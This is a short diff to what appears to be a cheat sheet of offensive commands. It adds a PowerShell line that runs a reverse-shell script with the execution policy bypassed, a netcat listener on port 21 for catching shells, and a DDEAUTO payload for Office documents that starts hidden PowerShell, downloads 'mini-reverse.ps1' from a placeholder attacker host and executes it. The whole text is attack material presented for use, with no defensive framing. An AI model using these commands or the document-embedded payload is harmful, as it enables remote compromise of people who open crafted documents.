@@ -1,1 +1,8 @@
-powershell -executionpolicy bypass -File .\reverse.ps1
+#Reverse Connect Windows bypass executionpolicy
+$powershell -executionpolicy bypass -File .\reverse.ps1
+
+#Bind Port Linux
+$nc -vlp 21
+
+#DDAUTO Exploit
+{ DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadFile('http://IP_ADDRESS/mini-reverse.ps1','coba.ps1');powershell -executionpolicy bypass -File coba.ps1" }
